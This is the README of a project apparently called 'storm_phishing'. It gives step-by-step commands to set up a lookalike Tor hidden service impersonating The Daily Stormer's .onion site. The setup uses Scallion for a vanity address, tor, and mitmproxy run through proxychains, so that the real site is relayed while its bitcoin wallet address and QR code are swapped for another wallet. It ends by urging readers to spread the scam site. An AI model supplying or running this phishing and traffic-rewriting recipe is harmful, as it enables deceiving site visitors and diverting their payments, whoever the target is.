# storm_phishing

Quick scripts to scam The Daily Stormer dark web site.

## Tools

### scallion

[Scallion](https://github.com/lachesis/scallion) lets you create vanity .onion
addresses. You'll need it to create a key pair for a dstormer--------.onion
address.

### tor

[tor](https://www.torproject.org/) hidden services let users publish web sites
and other services without needing to reveal the location of the site. You need
it to run the fake/scam dstormer--------.onion service.

### mitmproxy

[mitmproxy](https://mitmproxy.org/) is an interactive console program that 
allows traffic flows to be intercepted, inspected, modified, and replayed.
You need it to send requests to the real dstormer site, and then intercept
and/or change the contents of the responses.

### proxychains4

[proxychains](https://github.com/rofl0r/proxychains-ng) Redirects the HTTP 
connections from mitmproxy through tor, so they can reach the real dstormer
.onion site.

## Installation (Ubuntu)
```
sudo apt-get update
sudo apt-get install make gcc tor mitmproxy
git clone https://github.com/rofl0r/proxychains-ng.git
git clone https://github.com/storm-phisher/storm_phishing.git

cd proxychains-ng.git
./configure --prefix=/usr --sysconfdir=/etc
make && sudo make install && sudo make install-config
```

## Steps

1. Use scallion to generate a dstormer--------.onion hostname and key.

  ```
mono scallion/bin/Debug/scallion.exe -d 1 dstormer
...
<XmlMatchOutput>
  <Hash>dstormer--------.onion</Hash>
  <PrivateKey>-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----
</PrivateKey>
  <PublicModulusBytes>...</PublicModulusBytes>
  <PublicExponentBytes>...</PublicExponentBytes>
</XmlMatchOutput>
  ```

2. Make a directory for the scam hidden service.

  ```
sudo mkdir -m 700 /var/lib/tor/hidden_service
chown -R ubuntu:ubuntu /var/lib/tor
  ```

3. Put the `<Hash>` value into `hostname` file. E.g.,

  ```
echo "dstormer--------.onion" > /var/lib/tor/hidden_service/hostname
  ```

4. Put the `<PrivateKey>` value into `private_key` file. E.g.,

  ```
echo "-----BEGIN RSA PRIVATE KEY-----...-----END RSA PRIVATE KEY-----" > /var/lib/tor/hidden_service/hostname
  ```

5. Copy `torrc` from this repo to `/etc/tor/torrc`.

  ```
sudo cp torrc /etc/tor/torrc
  ```

6. Run `proxychains` and whatever `mitmproxy` script you want (E.g., this one replaces TDS bitcoin wallet with bitcoin wallet for tunapanda.org):

  ```
proxychains4 mitmproxy -p 20080 -R http://dstormer6em3i4km.onion --anticache -s "replace_string.py 19m9yEChBSPuzCzEMmg1dNbPvdLdWA59rS 1CU5YgjquupDw6UeXEyA9VEBH34R7fZ19b" --replace ":~hq .:<<<your-hostname>>>.onion:dstormer6em3i4km.onion" --replace ":~s:wp-content/uploads/2014/09/bitcoin-qr-code-daily-stormer.jpg:https://raw.githubusercontent.com/storm-phisher/storm_phishing/master/tunapanda-btc-qr.png"
  ```

7. Finally, run `tor` to run your dstormer--------.onion scam site.

8. Visit your dstormer--------.onion site and it should be working.

9. Be sure to share your scam site in whatever creative ways you like.
